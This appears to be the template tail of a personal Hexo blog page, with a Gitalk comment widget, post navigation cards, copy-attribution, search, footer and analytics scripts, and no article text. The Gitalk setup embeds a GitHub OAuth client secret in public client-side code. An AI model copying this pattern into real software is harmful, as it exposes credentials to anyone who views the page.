<script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io/libs/gitalk/gitalk.min.js"></script>
<script>
    let gitalk = new Gitalk({
        clientID: '116343b4650fce4789b6',
        clientSecret: '3e9be2ad6c9b693af1753290c7c059b1e4f34d5d',
        repo: 'miaotony.github.io',
        owner: 'miaotony',
        admin: "miaotony",
        id: '2020-11-08T03-20-00',
        distractionFreeMode: false  // Facebook-like distraction free mode
    });

    gitalk.render('gitalk-container');
</script>

    

    

    

    

    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
            <div class="card">
                <a href="/2020/11/18/Server_Vercel_Calc114514/">
                    <div class="card-image">
                        
                        
                        <img src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io/medias/featureimages/12.jpg" class="responsive-img" alt="基于Vercel Serverless部署Calc114514 API &amp; Telegram bot">
                        
                        <span class="card-title">基于Vercel Serverless部署Calc114514 API &amp; Telegram bot</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            受USTC Hackergame超精巧的数字论证器启发，基于Vercel Serverless实现了Calc114514 API & Telegram bot的部署，这里来记录一下吧。
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2020-11-18
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/Tech/" class="post-category">
                                    Tech
                                </a>
                            
                            <a href="/categories/Tech/Projects/" class="post-category">
                                    Projects
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/Tech/">
                        <span class="chip bg-color">Tech</span>
                    </a>
                    
                    <a href="/tags/Projects/">
                        <span class="chip bg-color">Projects</span>
                    </a>
                    
                    <a href="/tags/Web/">
                        <span class="chip bg-color">Web</span>
                    </a>
                    
                    <a href="/tags/Server/">
                        <span class="chip bg-color">Server</span>
                    </a>
                    
                    <a href="/tags/Serverless/">
                        <span class="chip bg-color">Serverless</span>
                    </a>
                    
                    <a href="/tags/Vercel/">
                        <span class="chip bg-color">Vercel</span>
                    </a>
                    
                    <a href="/tags/Telegram/">
                        <span class="chip bg-color">Telegram</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2020/11/05/CTF_2020_0xGame/">
                    <div class="card-image">
                        
                        
                        <img src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io/medias/featureimages/13.jpg" class="responsive-img" alt="CTF | 2020 0xGame Web&amp;Misc 部分WriteUp">
                        
                        <span class="card-title">CTF | 2020 0xGame Web&amp;Misc 部分WriteUp</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            南邮的师傅们整了个 0xGame，比赛持续了一个月，大概看了看做了做，题目还是有点意思的。
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2020-11-05
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/CTF/" class="post-category">
                                    CTF
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/CTF/">
                        <span class="chip bg-color">CTF</span>
                    </a>
                    
                    <a href="/tags/WriteUp/">
                        <span class="chip bg-color">WriteUp</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>


<script>
    $('#articleContent').on('copy', function (e) {
        // IE8 or earlier browser is 'undefined'
        if (typeof window.getSelection === 'undefined') return;

        var selection = window.getSelection();
        // if the selection is short let's not annoy our users.
        if (('' + selection).length < Number.parseInt('200')) {
            return;
        }

        // create a div outside of the visible area and fill it with the selected text.
        var bodyElement = document.getElementsByTagName('body')[0];
        var newdiv = document.createElement('div');
        newdiv.style.position = 'absolute';
        newdiv.style.left = '-99999px';
        bodyElement.appendChild(newdiv);
        newdiv.appendChild(selection.getRangeAt(0).cloneContents());

        // we need a <pre> tag workaround.
        // otherwise the text inside "pre" loses all the line breaks!
        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
        }

        var url = document.location.href;
        newdiv.innerHTML += '<br />'
            + '来源: MiaoTony&#39;s小窝<br />'
            + '文章作者: MiaoTony<br />'
            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
            + '本文章著作权归作者MiaoTony所有，任何形式的转载都请注明出处。';

        selection.selectAllChildren(newdiv);
        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
    });
</script>


<!-- 代码块功能依赖 -->
<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io/libs/codeBlock/codeBlockFuction.js"></script>

<!-- 代码语言 -->

<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io/libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io/libs/codeBlock/codeShrink.js"></script>


    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('1'),
            headingSelector: 'h2, h3, h4, h5'
        });

        // modify the toc link href to support Chinese.
        let i = 0;
        let tocHeading = 'toc-heading-';
        $('#toc-content a').each(function () {
            $(this).attr('href', '#' + tocHeading + (++i));
        });

        // modify the heading title id to support Chinese.
        i = 0;
        $('#articleContent').children('h2, h3, h4, h5').each(function () {
            $(this).attr('id', tocHeading + (++i));
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
        <div class="container row center-align" style="margin-bottom: 15px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2019-2021</span>
            
            <span id="year">2019</span>
            <a href="/about" target="_blank">MiaoTony</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            <br>
                        &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
                class="white-color">164.1k</span>&nbsp;字
                                                                                    <span id="busuanzi_container_site_pv">
			|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
                    class="white-color"></span>&nbsp;次
            </span>
                                    <span id="busuanzi_container_site_uv">
                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
                    class="white-color"></span>&nbsp;人
            </span>
                        <br>
                        <span id="sitetime">载入运行时间...</span>
            <script>
                function siteTime() {
                    var seconds = 1000;
                    var minutes = seconds * 60;
                    var hours = minutes * 60;
                    var days = hours * 24;
                    var years = days * 365;
                    var today = new Date();
                    var startYear = "2019";
                    var startMonth = "11";
                    var startDate = "28";
                    var startHour = "0";
                    var startMinute = "0";
                    var startSecond = "0";
                    var todayYear = today.getFullYear();
                    var todayMonth = today.getMonth() + 1;
                    var todayDate = today.getDate();
                    var todayHour = today.getHours();
                    var todayMinute = today.getMinutes();
                    var todaySecond = today.getSeconds();
                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
                    var diff = t2 - t1;
                    var diffYears = Math.floor(diff / years);
                    var diffDays = Math.floor((diff / days) - diffYears * 365);
                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
                        minutes);
                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
                        diffMinutes * minutes) / seconds);
                    if (startYear == todayYear) {
                        document.getElementById("year").innerHTML = todayYear;
                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffDays + " 天 " + diffHours +
                            " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
                    } else {
                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffYears + " 年 " + diffDays +
                            " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
                    }
                }
                setInterval(siteTime, 1000);
            </script>
                        <br>
                    </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://t.me/MiaoTonyChannel" class="tooltipped" target="_blank" data-tooltip="关注我的TelegramChannel: @MiaoTonyChannel" data-position="top" data-delay="50">
        <i class="fab fa-telegram"></i>
    </a>



    <a href="https://github.com/miaotony" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:miaotony@outlook.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>













    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io/libs/materialize/materialize.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io/libs/aos/aos.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io/js/matery.min.js"></script>

    
<script>
    var _hmt = _hmt || [];
    (function () {
        var hm = document.createElement("script");
        hm.src = "https://hm.baidu.com/hm.js?40e312a1eec109cf96e30988cf3bfe70";
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(hm, s);
    })();
</script>

    
    
    <script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io/libs/others/clicklove.js" async="async"></script>
    
    
    <script async src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io/libs/others/busuanzi.pure.mini.js"></script>
    

    

    

    
    

    

    

    
    <script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io/libs/instantpage/instantpage.js" type="module"></script>
    

</body>

</html>
